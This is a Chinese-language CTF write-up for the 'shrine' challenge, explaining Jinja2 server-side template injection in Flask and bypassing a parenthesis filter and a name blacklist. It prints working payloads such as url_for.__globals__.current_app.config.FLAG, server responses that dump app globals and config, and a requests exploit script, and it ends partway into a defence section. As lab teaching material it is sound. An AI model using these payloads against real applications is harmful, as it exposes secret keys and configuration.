# Writeup 4 [WesternCTF2018] shrine



## 题目信息

| 项目     | 内容                                                         |
| -------- | ------------------------------------------------------------ |
| 题目名称 | [WesternCTF2018] shrine                                      |
| 题目类型 | Web - SSTI（服务端模板注入）                                 |
| 考点     | Jinja2 模板注入、Flask 全局变量、`__globals__` 属性绕过      |
| 靶机地址 | `http://5f4d5a1e-ebdd-45f8-9291-efb856384fee.node5.buuoj.cn:81/` |


## 一、SSTI 漏洞原理

### 1.1 什么是 SSTI

**SSTI（Server-Side Template Injection，服务端模板注入）** 是一种 Web 安全漏洞。当应用程序将用户输入直接拼接到模板中，并使用模板引擎渲染时，攻击者可以注入恶意模板代码，导致服务器执行非预期操作。

### 1.2 Jinja2 模板引擎

Flask 默认使用 Jinja2 作为模板引擎。Jinja2 允许在模板中使用动态表达式，语法包括：

| 语法        | 用途                       | 示例                      |
| ----------- | -------------------------- | ------------------------- |
| `{{ ... }}` | 变量插值，输出表达式的值   | `{{ 7*7 }}` → `49`        |
| `{% ... %}` | 控制结构（循环、条件判断） | `{% for i in range(5) %}` |
| `{# ... #}` | 模板注释                   | `{# 这是注释 #}`          |

### 1.3 SSTI 漏洞成因

当开发者使用 `render_template_string()` 函数，且渲染的内容中包含用户可控的输入时，就可能产生 SSTI 漏洞：

```python
# 危险写法：用户输入直接拼接到模板中
@app.route('/bad')
def bad():
    user_input = request.args.get('name')
    template = f"<h1>Hello, {user_input}!</h1>"
    return render_template_string(template)  # 存在 SSTI
```

```python
# 安全写法：使用参数传递
@app.route('/safe')
def safe():
    user_input = request.args.get('name')
    return render_template_string("<h1>Hello, {{ name }}!</h1>", name=user_input)
```

### 1.4 Jinja2 模板执行原理

Jinja2 渲染模板时，会解析模板字符串，将 `{{ ... }}` 中的表达式作为 Python 代码执行。这意味着攻击者可以在 `{{ }}` 中编写 Python 表达式，访问对象属性、调用方法。

```python
from jinja2 import Template

# 模板字符串中的 {{ 7*7 }} 会被计算为 49
template = Template("{{ 7*7 }}")
print(template.render())  # 输出: 49
```


## 二、Flask 常用函数详解

### 2.1 `render_template_string()`

**语法**：

```python
render_template_string(source, **context)
```

**参数说明**：

- `source`：模板字符串内容
- `**context`：传递给模板的变量（可选）

**作用**：将字符串作为 Jinja2 模板进行渲染。

**示例**：

```python
from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/')
def index():
    name = "Flask"
    # 方式1：直接拼接变量
    return render_template_string("<h1>Hello, {{ name }}</h1>", name=name)
```

**在本题中的应用**：源码中使用 `render_template_string(safe_jinja(shrine))` 将经过处理的用户输入作为模板渲染，这是 SSTI 漏洞的根源。

### 2.2 `url_for()`

**语法**：

```python
url_for(endpoint, **values)
```

**参数说明**：

- `endpoint`：视图函数名或路由端点名称
- `**values`：URL 中的变量参数

**作用**：根据视图函数名生成对应的 URL，避免硬编码 URL 路径。

**示例**：

```python
from flask import Flask, url_for

app = Flask(__name__)

@app.route('/user/<username>')
def user_profile(username):
    return f"User: {username}"

# 生成 URL: /user/john
with app.test_request_context():
    print(url_for('user_profile', username='john'))
```

**在本题中的应用**：`url_for` 是 Flask 内置的全局函数，在 Jinja2 模板中可以直接使用。我们可以通过 `url_for.__globals__` 访问其全局变量，从而获取 `current_app` 对象。

### 2.3 `get_flashed_messages()`

**语法**：

```python
get_flashed_messages(with_categories=False, category_filter=[])
```

**参数说明**：

- `with_categories`：是否返回消息类别（默认 False）
- `category_filter`：过滤指定类别的消息

**作用**：获取通过 `flash()` 函数存储的闪现消息，常用于在模板中显示用户提示。

**示例**：

```python
from flask import Flask, flash, get_flashed_messages

app = Flask(__name__)
app.secret_key = 'secret'

@app.route('/')
def index():
    flash('登录成功！', 'success')
    messages = get_flashed_messages(with_categories=True)
    # messages = [('success', '登录成功！')]
    return render_template_string("{{ messages }}", messages=messages)
```

**在本题中的应用**：与 `url_for` 类似，`get_flashed_messages` 也是 Flask 内置的全局函数，可以通过 `__globals__` 属性访问全局变量。


## 三、源码分析

### 3.1 完整源码

```python
import flask
import os

app = flask.Flask(__name__)
app.config['FLAG'] = os.environ.pop('FLAG')

@app.route('/')
def index():
    return open(__file__).read()

@app.route('/shrine/')
def shrine(shrine):
    def safe_jinja(s):
        s = s.replace('(', '').replace(')', '')
        blacklist = ['config', 'self']
        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s
    return flask.render_template_string(safe_jinja(shrine))

if __name__ == '__main__':
    app.run(debug=True)
```

### 3.2 逐行分析

| 行号  | 代码                                                         | 解释                                        |
| :---: | ------------------------------------------------------------ | ------------------------------------------- |
|  1-2  | `import flask, os`                                           | 导入 Flask 框架和操作系统模块               |
|   4   | `app = flask.Flask(__name__)`                                | 创建 Flask 应用实例                         |
|   5   | `app.config['FLAG'] = os.environ.pop('FLAG')`                | 从环境变量中取出 FLAG 并存入 app 配置       |
|  7-9  | `@app.route('/')` + `index()`                                | 首页路由，返回当前文件源码                  |
|  11   | `@app.route('/shrine/')`                                     | shrine 路由，参数通过 URL 路径传递          |
| 12-16 | `def safe_jinja(s):`                                         | 安全过滤函数                                |
|  13   | `s = s.replace('(', '').replace(')', '')`                    | **过滤圆括号**：删除所有 `(` 和 `)`         |
|  14   | `blacklist = ['config', 'self']`                             | 黑名单变量名                                |
|  15   | `return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist]) + s` | 将黑名单变量设置为 `None`，然后拼接到模板前 |
|  17   | `return flask.render_template_string(safe_jinja(shrine))`    | 将处理后的用户输入作为模板渲染              |

### 3.3 安全防护机制

源码中的防护措施：

1. **括号过滤**：删除所有 `(` 和 `)`，阻止函数调用
2. **变量名黑名单**：`config` 和 `self` 被设置为 `None`

### 3.4 漏洞分析

尽管存在防护，但以下问题导致可以绕过：

1. **`url_for` 和 `get_flashed_messages` 未被过滤**：这些是 Flask 内置的全局函数，在模板中可直接使用
2. **`__globals__` 属性未被过滤**：Python 函数对象都有 `__globals__` 属性，可访问函数所在模块的全局变量
3. **`current_app` 未被过滤**：`__globals__` 中可能包含 `current_app`（Flask 应用实例）


## 四、绕过过滤的技术原理

### 4.1 括号过滤的绕过

源码中 `s.replace('(', '').replace(')', '')` 会删除所有圆括号。但 Jinja2 中调用函数不一定需要括号：

```python
# 有括号的方式（被过滤）
{{ "hello".upper() }}

# 无括号的替代方式（可用）
{{ "hello"|upper }}
{{ "hello".__getattribute__('upper') }}
```

在本题中，我们使用的是 **属性访问链**，没有使用括号：

```python
{{ url_for.__globals__.current_app.config.FLAG }}
```

### 4.2 变量名黑名单的绕过

源码中 `{{% set config=None%}}` 和 `{{% set self=None%}}` 将变量名 `config` 和 `self` 设置为 `None`。

但这是**变量名的替换**，而不是字符串的替换。以下写法不受影响：

```python
# 被过滤的写法（变量名 config 被替换）
{{ config }}

# 绕过写法（config 作为字符串，不是变量名）
{{ request.application['config'] }}

# 绕过写法（属性访问链中的 config 不是独立变量）
{{ current_app.config.FLAG }}
```

在最终 payload 中，`config` 是 `current_app` 对象的属性，不是独立的变量名，因此不会被替换。

### 4.3 `__globals__` 属性的利用

在 Python 中，每个函数对象都有一个 `__globals__` 属性，它是一个字典，包含函数定义所在模块的所有全局变量。

```python
def test():
    pass

# __globals__ 包含模块中定义的所有全局变量
print(test.__globals__.keys())
```

在 Jinja2 模板中，我们可以通过 `函数.__globals__` 访问这些全局变量。

**在本题中的应用**：

```python
# url_for 是 Flask 注册的全局函数
# url_for.__globals__ 返回一个字典，包含 Flask 的全局变量
# 其中包括 current_app（当前 Flask 应用实例）
# current_app.config 就是应用的配置字典
# current_app.config.FLAG 就是 flag
```

### 4.4 属性访问的多种方式

在 Python 和 Jinja2 中，访问对象属性有多种方式：

|        方式        | 示例                           | 说明                     |
| :----------------: | ------------------------------ | ------------------------ |
|        点号        | `obj.attr`                     | 最常用的方式             |
|       中括号       | `obj['attr']`                  | 适用于属性名包含特殊字符 |
|    `getattr()`     | `getattr(obj, 'attr')`         | 内置函数                 |
| `__getattribute__` | `obj.__getattribute__('attr')` | 底层方法                 |
|  `|attr()` 过滤器  | `obj|attr('attr')`             | Jinja2 过滤器            |

**在本题中的应用**：使用点号访问是最简洁的方式：

```python
{{ url_for.__globals__.current_app.config.FLAG }}
```

如果点号被过滤，可以使用中括号或 `|attr()` 过滤器绕过。


## 五、Flask 全局变量详解

Flask 提供了几个可以在模板中直接使用的全局变量：

### 5.1 `config`

|       属性       | 说明                           |
| :--------------: | ------------------------------ |
|     **类型**     | `flask.Config` 对象            |
|   **生命周期**   | 应用生命周期                   |
|   **主要属性**   | `DEBUG`、`SECRET_KEY` 等配置项 |
| **在模板中使用** | `{{ config.DEBUG }}`           |

**作用**：存储 Flask 应用的配置信息，可以通过 `app.config['KEY'] = value` 设置。

**在本题中的应用**：flag 被存储在 `app.config['FLAG']` 中，但 `config` 变量名被黑名单过滤，需要通过 `current_app.config` 访问。

### 5.2 `request`

|       属性       | 说明                                                  |
| :--------------: | ----------------------------------------------------- |
|     **类型**     | `flask.Request` 对象                                  |
|   **生命周期**   | 请求生命周期                                          |
|   **主要属性**   | `method`、`args`、`form`、`cookies`、`headers`、`url` |
| **在模板中使用** | `{{ request.url }}`                                   |

**作用**：封装客户端发送的 HTTP 请求信息。

**示例**：

```python
from flask import request

@app.route('/')
def index():
    name = request.args.get('name')      # GET 参数
    method = request.method              # 请求方法
    user_agent = request.headers.get('User-Agent')  # 请求头
```

### 5.3 `session`

|       属性       | 说明                         |
| :--------------: | ---------------------------- |
|     **类型**     | 类字典对象                   |
|   **生命周期**   | 跨请求（用户会话期间）       |
|   **主要用途**   | 存储用户登录状态等跨请求数据 |
| **在模板中使用** | `{{ session.user }}`         |

**作用**：在不同请求之间存储用户数据，数据经过签名加密。

**示例**：

```python
from flask import session

app.secret_key = 'your-secret-key'

@app.route('/login')
def login():
    session['user_id'] = 123  # 存储到会话
    return 'Logged in'

@app.route('/profile')
def profile():
    user_id = session.get('user_id')  # 读取到会话
```

### 5.4 `g` (Global)

|       属性       | 说明                             |
| :--------------: | -------------------------------- |
|     **类型**     | `flask.g` 对象                   |
|   **生命周期**   | 请求生命周期                     |
|   **主要用途**   | 在同一个请求的不同函数间共享数据 |
| **在模板中使用** | `{{ g.db }}`                     |

**作用**：在应用上下文期间保存临时数据，如数据库连接。

**示例**：

```python
from flask import g

@app.before_request
def before_request():
    g.db = connect_to_database()  # 存储数据库连接

@app.route('/')
def index():
    data = g.db.query('SELECT * FROM users')  # 使用连接
```

### 5.5 `current_app`

|     属性     | 说明                            |
| :----------: | ------------------------------- |
|   **类型**   | `flask.Flask` 对象              |
| **生命周期** | 应用上下文生命周期              |
| **主要属性** | `config`、`view_functions` 等   |
| **获取方式** | `from flask import current_app` |

**作用**：获取当前激活的 Flask 应用实例，用于访问应用级配置。

**在本题中的应用**：通过 `url_for.__globals__.current_app` 获取应用实例，然后访问 `config['FLAG']`。

### 5.6 对比总结

|     变量      |  生命周期  |    主要用途    | 是否被本题过滤     |
| :-----------: | :--------: | :------------: | ------------------ |
|   `config`    |    应用    |    应用配置    | ✅ 被过滤（变量名） |
|   `request`   |    请求    | HTTP 请求信息  | ❌ 未被过滤         |
|   `session`   |   跨请求   |  用户会话数据  | ❌ 未被过滤         |
|      `g`      |    请求    | 请求内临时存储 | ❌ 未被过滤         |
| `current_app` | 应用上下文 |    应用实例    | ❌ 未被过滤         |


## 六、Flask 全局函数详解

Flask 在 Jinja2 模板中默认注册了几个全局函数：

### 6.1 `url_for()`

**签名**：

```python
url_for(endpoint: str, **values) -> str
```

**参数**：

- `endpoint`：视图函数的名称（字符串）
- `**values`：URL 变量参数

**返回值**：构建的 URL 字符串

**作用**：根据视图函数名和参数动态生成 URL。

**示例**：

```python
# 假设有路由: @app.route('/user/<username>')
url_for('user_profile', username='john')  # 返回 '/user/john'
```

**在 SSTI 中的应用**：`url_for.__globals__` 可以访问 Flask 的全局变量。

### 6.2 `get_flashed_messages()`

**签名**：

```python
get_flashed_messages(with_categories: bool = False, category_filter: List[str] = []) -> List
```

**参数**：

- `with_categories`：是否返回类别信息，默认 `False`
- `category_filter`：过滤指定类别的消息

**返回值**：消息列表，如果 `with_categories=True` 则返回 `(category, message)` 元组

**作用**：获取通过 `flash()` 存储的闪现消息，常用于显示用户提示。

**示例**：

```python
# 存储消息
flash('操作成功！', 'success')

# 获取消息
messages = get_flashed_messages(with_categories=True)
# [('success', '操作成功！')]
```

**在 SSTI 中的应用**：与 `url_for` 类似，`get_flashed_messages.__globals__` 也可以访问全局变量。


## 七、Flask 环境变量

### 7.1 什么是环境变量

环境变量是操作系统级别的键值对配置，可以在程序启动前设置，程序通过 `os.environ` 读取。

### 7.2 Flask 中常用的环境变量

|   环境变量    | 说明                               | 示例值          |
| :-----------: | ---------------------------------- | --------------- |
|  `FLASK_APP`  | 指定 Flask 应用的入口文件          | `app.py`        |
|  `FLASK_ENV`  | 运行环境（development/production） | `development`   |
| `FLASK_DEBUG` | 是否开启调试模式                   | `1`             |
| `SECRET_KEY`  | 应用密钥（常用，非 Flask 标准）    | `random-string` |
|    `FLAG`     | CTF 题目中存储 flag 的变量         | `flag{...}`     |

### 7.3 在代码中读取环境变量

```python
import os

# 方式1：直接读取，不存在时返回 None
flag = os.environ.get('FLAG')

# 方式2：读取并移除（pop）
flag = os.environ.pop('FLAG')  # 读取后从环境变量中删除

# 方式3：指定默认值
debug = os.environ.get('DEBUG', 'False')
```

### 7.4 本题中的环境变量使用

```python
app.config['FLAG'] = os.environ.pop('FLAG')
```

这行代码的作用：

1. 从系统环境变量中读取 `FLAG` 的值
2. 将值存入 Flask 应用的 `config` 字典中
3. 从环境变量中删除 `FLAG`（防止后续被读取）


## 八、Python 属性访问机制

### 8.1 `__globals__` 属性

在 Python 中，每个函数都有一个 `__globals__` 属性，它返回一个字典，包含函数定义所在模块的所有全局变量。

```python
# 示例
x = 100

def test():
    pass

print(test.__globals__['x'])  # 输出: 100
```

**在 SSTI 中的应用**：通过访问 `url_for.__globals__`，我们可以获取 Flask 模块中的所有全局变量，包括 `current_app`。

### 8.2 `__dict__` 属性

Python 对象的 `__dict__` 属性包含对象的所有属性和方法。

```python
class Person:
    def __init__(self):
        self.name = 'John'
        self.age = 30

p = Person()
print(p.__dict__)  # {'name': 'John', 'age': 30}
```

### 8.3 `__class__` 属性

每个对象都有 `__class__` 属性，指向其所属的类。

```python
s = "hello"
print(s.__class__)  # <class 'str'>
```

### 8.4 `__bases__` 和 `__mro__`

- `__bases__`：返回类的基类元组
- `__mro__`：返回方法解析顺序（Method Resolution Order）

```python
class Parent:
    pass

class Child(Parent):
    pass

print(Child.__bases__)  # (<class '__main__.Parent'>,)
print(Child.__mro__)    # (Child, Parent, object)
```

### 8.5 `__subclasses__()` 方法

返回类的所有子类列表。这是 SSTI 中常用的方法，可以用来找到 `os` 模块或 `subprocess` 模块。

```python
# 通过空字符串的 __class__ 获取 str 类
# 然后通过 __mro__ 获取 object 类
# 再通过 __subclasses__() 获取所有子类
# 从中找到可以执行命令的类
```

**在本题中的应用**：本题不需要使用 `__subclasses__()`，因为直接通过 `url_for.__globals__` 就能访问 `current_app`。


## 九、Payload 详解

### 9.1 最终 Payload

```
http://4c962a7d-2d67-41e0-af09-3c51bdb3a051.node5.buuoj.cn:81/shrine/{{url_for.__globals__.current_app.config.FLAG}}
```

### 9.2 逐步拆解

| 步骤 | 表达式                                        | 返回值               | 说明                                |
| :--: | --------------------------------------------- | -------------------- | ----------------------------------- |
|  1   | `url_for`                                     | `<function url_for>` | Flask 内置的 URL 生成函数           |
|  2   | `url_for.__globals__`                         | `dict`               | 返回函数所在模块的全局变量字典      |
|  3   | `url_for.__globals__.current_app`             | `<Flask app>`        | 从全局变量中获取当前 Flask 应用实例 |
|  4   | `url_for.__globals__.current_app.config`      | `<Config dict>`      | 应用的配置字典                      |
|  5   | `url_for.__globals__.current_app.config.FLAG` | `flag{...}`          | 从配置中读取 FLAG 值                |

### 9.3 为什么这个 Payload 能绕过过滤

| 过滤规则             | Payload 中的体现                   | 绕过原因                                 |
| -------------------- | ---------------------------------- | ---------------------------------------- |
| 过滤 `(` 和 `)`      | Payload 中没有使用括号             | 不需要调用函数，只是属性访问             |
| `config` 被设为 None | `current_app.config` 中的 `config` | 这是属性名，不是独立的变量名，不会被替换 |
| `self` 被设为 None   | Payload 中没有使用 `self`          | 直接绕过                                 |

### 9.4 其他可用 Payload

```python
# 使用 get_flashed_messages
http://4c962a7d-2d67-41e0-af09-3c51bdb3a051.node5.buuoj.cn:81/shrine/{{get_flashed_messages.__globals__.current_app.config.FLAG}}
```

页面显示：

```
flag{9bc2c9a7-f37c-42f7-8460-c7d78e7cef10}
```



## 十、解题步骤

### 10.1 信息收集

访问首页，确认题目信息：

```http
http://4c962a7d-2d67-41e0-af09-3c51bdb3a051.node5.buuoj.cn:81/
```

返回首页源码。

### 10.2 验证 SSTI 漏洞

```python
import requests

base_url = "http://4c962a7d-2d67-41e0-af09-3c51bdb3a051.node5.buuoj.cn:81/shrine"
payload = "{{7*7}}"
url = f"{base_url}/{payload}"
resp = requests.get(url)
print(resp.text)  # 输出: 49
```

运行结果：

```python
49

进程已结束，退出代码为 0
```

### 10.3 测试黑名单过滤

**测试 config 被过滤：**

```http
http://4c962a7d-2d67-41e0-af09-3c51bdb3a051.node5.buuoj.cn:81/shrine/{{config}}
```

**页面返回：**

```html
None
```

**测试 request 可用：**

```http
http://4c962a7d-2d67-41e0-af09-3c51bdb3a051.node5.buuoj.cn:81/shrine/{{request}}
```

**页面返回：**

```html
<Request 'http://4c962a7d-2d67-41e0-af09-3c51bdb3a051.node5.buuoj.cn/shrine/%7B%7Brequest%7D%7D' [GET]>
```

### 10.4 构造绕过 Payload

通过 url_for 获取 __globals__

```http
http://4c962a7d-2d67-41e0-af09-3c51bdb3a051.node5.buuoj.cn:81/shrine/{{url_for.__globals__}}
```

页面返回：全局变量字典

```html
{'find_package': <function find_package at 0x7f03f92be140>, '_find_package_path': <function _find_package_path at 0x7f03f92be0c8>, 'get_load_dotenv': <function get_load_dotenv at 0x7f03f93e0a28>, '_PackageBoundObject': <class 'flask.helpers._PackageBoundObject'>, 'current_app': <Flask 'app'>, 'PY2': True, 'send_from_directory': <function send_from_directory at 0x7f03f93e0ed8>, 'session': <NullSession {}>, 'io': <module 'io' from '/usr/local/lib/python2.7/io.pyc'>, 'get_flashed_messages': <function get_flashed_messages at 0x7f03f93e0d70>, 'BadRequest': <class 'werkzeug.exceptions.BadRequest'>, 'is_ip': <function is_ip at 0x7f03f92be7d0>, 'pkgutil': <module 'pkgutil' from '/usr/local/lib/python2.7/pkgutil.pyc'>, 'BuildError': <class 'werkzeug.routing.BuildError'>, 'url_quote': <function url_quote at 0x7f03f961daa0>, 'FileSystemLoader': <class 'jinja2.loaders.FileSystemLoader'>, 'get_root_path': <function get_root_path at 0x7f03f93e0f50>, '__package__': 'flask', 'locked_cached_property': <class 'flask.helpers.locked_cached_property'>, '_app_ctx_stack': <werkzeug.local.LocalStack object at 0x7f03f9410850>, '_endpoint_from_view_func': <function _endpoint_from_view_func at 0x7f03f93e0aa0>, 'total_seconds': <function total_seconds at 0x7f03f92be1b8>, 'fspath': <function fspath at 0x7f03f9400e60>, 'get_env': <function get_env at 0x7f03f93e06e0>, 'RequestedRangeNotSatisfiable': <class 'werkzeug.exceptions.RequestedRangeNotSatisfiable'>, 'flash': <function flash at 0x7f03f93e0cf8>, 'mimetypes': <module 'mimetypes' from '/usr/local/lib/python2.7/mimetypes.pyc'>, 'adler32': <built-in function adler32>, 'get_template_attribute': <function get_template_attribute at 0x7f03f93e0c80>, '_request_ctx_stack': <werkzeug.local.LocalStack object at 0x7f03f9405390>, '__builtins__': {'bytearray': <type 'bytearray'>, 'IndexError': <type 'exceptions.IndexError'>, 'all': <built-in function all>, 'help': Type help() for interactive help, or help(object) for help about object., 'vars': <built-in function vars>, 'SyntaxError': <type 'exceptions.SyntaxError'>, 'unicode': <type 'unicode'>, 'UnicodeDecodeError': <type 'exceptions.UnicodeDecodeError'>, 'memoryview': <type 'memoryview'>, 'isinstance': <built-in function isinstance>, 'copyright': Copyright (c) 2001-2019 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., 'NameError': <type 'exceptions.NameError'>, 'BytesWarning': <type 'exceptions.BytesWarning'>, 'dict': <type 'dict'>, 'input': <built-in function input>, 'oct': <built-in function oct>, 'bin': <built-in function bin>, 'SystemExit': <type 'exceptions.SystemExit'>, 'StandardError': <type 'exceptions.StandardError'>, 'format': <built-in function format>, 'repr': <built-in function repr>, 'sorted': <built-in function sorted>, 'False': False, 'RuntimeWarning': <type 'exceptions.RuntimeWarning'>, 'list': <type 'list'>, 'iter': <built-in function iter>, 'reload': <built-in function reload>, 'Warning': <type 'exceptions.Warning'>, '__package__': None, 'round': <built-in function round>, 'dir': <built-in function dir>, 'cmp': <built-in function cmp>, 'set': <type 'set'>, 'bytes': <type 'str'>, 'reduce': <built-in function reduce>, 'intern': <built-in function intern>, 'issubclass': <built-in function issubclass>, 'Ellipsis': Ellipsis, 'EOFError': <type 'exceptions.EOFError'>, 'locals': <built-in function locals>, 'BufferError': <type 'exceptions.BufferError'>, 'slice': <type 'slice'>, 'FloatingPointError': <type 'exceptions.FloatingPointError'>, 'sum': <built-in function sum>, 'getattr': <built-in function getattr>, 'abs': <built-in function abs>, 'exit': Use exit() or Ctrl-D (i.e. EOF) to exit, 'print': <built-in function print>, 'True': True, 'FutureWarning': <type 'exceptions.FutureWarning'>, 'ImportWarning': <type 'exceptions.ImportWarning'>, 'None': None, 'hash': <built-in function hash>, 'ReferenceError': <type 'exceptions.ReferenceError'>, 'len': <built-in function len>, 'credits': Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., 'frozenset': <type 'frozenset'>, '__name__': '__builtin__', 'ord': <built-in function ord>, 'super': <type 'super'>, 'TypeError': <type 'exceptions.TypeError'>, 'license': Type license() to see the full license text, 'KeyboardInterrupt': <type 'exceptions.KeyboardInterrupt'>, 'UserWarning': <type 'exceptions.UserWarning'>, 'filter': <built-in function filter>, 'range': <built-in function range>, 'staticmethod': <type 'staticmethod'>, 'SystemError': <type 'exceptions.SystemError'>, 'BaseException': <type 'exceptions.BaseException'>, 'pow': <built-in function pow>, 'RuntimeError': <type 'exceptions.RuntimeError'>, 'float': <type 'float'>, 'MemoryError': <type 'exceptions.MemoryError'>, 'StopIteration': <type 'exceptions.StopIteration'>, 'globals': <built-in function globals>, 'divmod': <built-in function divmod>, 'enumerate': <type 'enumerate'>, 'apply': <built-in function apply>, 'LookupError': <type 'exceptions.LookupError'>, 'open': <built-in function open>, 'quit': Use quit() or Ctrl-D (i.e. EOF) to exit, 'basestring': <type 'basestring'>, 'UnicodeError': <type 'exceptions.UnicodeError'>, 'zip': <built-in function zip>, 'hex': <built-in function hex>, 'long': <type 'long'>, 'next': <built-in function next>, 'ImportError': <type 'exceptions.ImportError'>, 'chr': <built-in function chr>, 'xrange': <type 'xrange'>, 'type': <type 'type'>, '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", 'Exception': <type 'exceptions.Exception'>, 'tuple': <type 'tuple'>, 'UnicodeTranslateError': <type 'exceptions.UnicodeTranslateError'>, 'reversed': <type 'reversed'>, 'UnicodeEncodeError': <type 'exceptions.UnicodeEncodeError'>, 'IOError': <type 'exceptions.IOError'>, 'hasattr': <built-in function hasattr>, 'delattr': <built-in function delattr>, 'setattr': <built-in function setattr>, 'raw_input': <built-in function raw_input>, 'SyntaxWarning': <type 'exceptions.SyntaxWarning'>, 'compile': <built-in function compile>, 'ArithmeticError': <type 'exceptions.ArithmeticError'>, 'str': <type 'str'>, 'property': <type 'property'>, 'GeneratorExit': <type 'exceptions.GeneratorExit'>, 'int': <type 'int'>, '__import__': <built-in function __import__>, 'KeyError': <type 'exceptions.KeyError'>, 'coerce': <built-in function coerce>, 'PendingDeprecationWarning': <type 'exceptions.PendingDeprecationWarning'>, 'file': <type 'file'>, 'EnvironmentError': <type 'exceptions.EnvironmentError'>, 'unichr': <built-in function unichr>, 'id': <built-in function id>, 'OSError': <type 'exceptions.OSError'>, 'DeprecationWarning': <type 'exceptions.DeprecationWarning'>, 'min': <built-in function min>, 'UnicodeWarning': <type 'exceptions.UnicodeWarning'>, 'execfile': <built-in function execfile>, 'any': <built-in function any>, 'complex': <type 'complex'>, 'bool': <type 'bool'>, 'ValueError': <type 'exceptions.ValueError'>, 'NotImplemented': NotImplemented, 'map': <built-in function map>, 'buffer': <type 'buffer'>, 'max': <built-in function max>, 'object': <type 'object'>, 'TabError': <type 'exceptions.TabError'>, 'callable': <built-in function callable>, 'ZeroDivisionError': <type 'exceptions.ZeroDivisionError'>, 'eval': <built-in function eval>, '__debug__': True, 'IndentationError': <type 'exceptions.IndentationError'>, 'AssertionError': <type 'exceptions.AssertionError'>, 'classmethod': <type 'classmethod'>, 'UnboundLocalError': <type 'exceptions.UnboundLocalError'>, 'NotImplementedError': <type 'exceptions.NotImplementedError'>, 'AttributeError': <type 'exceptions.AttributeError'>, 'OverflowError': <type 'exceptions.OverflowError'>}, 'text_type': <type 'unicode'>, '__file__': '/usr/local/lib/python2.7/site-packages/flask/helpers.pyc', 'get_debug_flag': <function get_debug_flag at 0x7f03f93e07d0>, 'RLock': <function RLock at 0x7f03f9d082a8>, 'safe_join': <function safe_join at 0x7f03f93e0e60>, 'sys': <module 'sys' (built-in)>, 'Headers': <class 'werkzeug.datastructures.Headers'>, 'stream_with_context': <function stream_with_context at 0x7f03f93e0b18>, '_os_alt_seps': [], '__name__': 'flask.helpers', '_missing': <object object at 0x7f03f9e6c1b0>, 'posixpath': <module 'posixpath' from '/usr/local/lib/python2.7/posixpath.pyc'>, 'NotFound': <class 'werkzeug.exceptions.NotFound'>, 'unicodedata': <module 'unicodedata' from '/usr/local/lib/python2.7/lib-dynload/unicodedata.so'>, 'wrap_file': <function wrap_file at 0x7f03f9647668>, 'socket': <module 'socket' from '/usr/local/lib/python2.7/socket.pyc'>, 'update_wrapper': <function update_wrapper at 0x7f03f9d531b8>, 'make_response': <function make_response at 0x7f03f93e0b90>, 'request': <Request 'http://4c962a7d-2d67-41e0-af09-3c51bdb3a051.node5.buuoj.cn/shrine/%7B%7Burl_for.__globals__%7D%7D' [GET]>, 'string_types': (<type 'str'>, <type 'unicode'>), 'message_flashed': <flask.signals._FakeSignal object at 0x7f03f92bb310>, '__doc__': '\n flask.helpers\n ~~~~~~~~~~~~~\n\n Implements various helpers.\n\n :copyright: 2010 Pallets\n :license: BSD-3-Clause\n', 'send_file': <function send_file at 0x7f03f93e0de8>, 'time': <built-in function time>, 'url_for': <function url_for at 0x7f03f93e0c08>, '_matching_loader_thinks_module_is_package': <function _matching_loader_thinks_module_is_package at 0x7f03f92be050>, 'os': <module 'os' from '/usr/local/lib/python2.7/os.pyc'>}
```



获取 current_app：

```
http://4c962a7d-2d67-41e0-af09-3c51bdb3a051.node5.buuoj.cn:81/shrine/{{url_for.__globals__.current_app}}
```

页面返回: Flask 应用实例

```html
<Flask 'app'>
```



获取 config：

```
http://4c962a7d-2d67-41e0-af09-3c51bdb3a051.node5.buuoj.cn:81/shrine/{{url_for.__globals__.current_app.config}}
```

页面返回: 配置字典

```html
<Config {'JSON_AS_ASCII': True, 'USE_X_SENDFILE': False, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_NAME': 'session', 'MAX_COOKIE_SIZE': 4093, 'SESSION_COOKIE_SAMESITE': None, 'PROPAGATE_EXCEPTIONS': None, 'ENV': 'production', 'DEBUG': False, 'SECRET_KEY': None, 'EXPLAIN_TEMPLATE_LOADING': False, 'MAX_CONTENT_LENGTH': None, 'APPLICATION_ROOT': '/', 'SERVER_NAME': None, 'FLAG': 'flag{9bc2c9a7-f37c-42f7-8460-c7d78e7cef10}', 'PREFERRED_URL_SCHEME': 'http', 'JSONIFY_PRETTYPRINT_REGULAR': False, 'TESTING': False, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31), 'TEMPLATES_AUTO_RELOAD': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'JSON_SORT_KEYS': True, 'JSONIFY_MIMETYPE': 'application/json', 'SESSION_COOKIE_HTTPONLY': True, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200), 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'TRAP_HTTP_EXCEPTIONS': False}>
```



获取 FLAG

```http
http://4c962a7d-2d67-41e0-af09-3c51bdb3a051.node5.buuoj.cn:81/shrine/{{url_for.__globals__.current_app.config.FLAG}}
```

页面返回：flag

```html
flag{9bc2c9a7-f37c-42f7-8460-c7d78e7cef10}
```

### 10.5 最终 Exploit

```python
import requests
from urllib.parse import quote

base_url = "http://4c962a7d-2d67-41e0-af09-3c51bdb3a051.node5.buuoj.cn:81/shrine"
payload = "{{url_for.__globals__.current_app.config.FLAG}}"
encoded = quote(payload, safe='')
url = f"{base_url}/{encoded}"
resp = requests.get(url)
print("Flag:", resp.text)
```

运行结果：

```python
Flag: flag{9bc2c9a7-f37c-42f7-8460-c7d78e7cef10}

进程已结束，退出代码为 0
```




## 十一、防御措施

### 11.1 使用安全的渲染方式

```python
# 错误做法：直接拼接用户输入
template = f"<h1>Hello, {user_input}!</h1>"
return render_template_string(template)

# 正确做法：使用参数传递
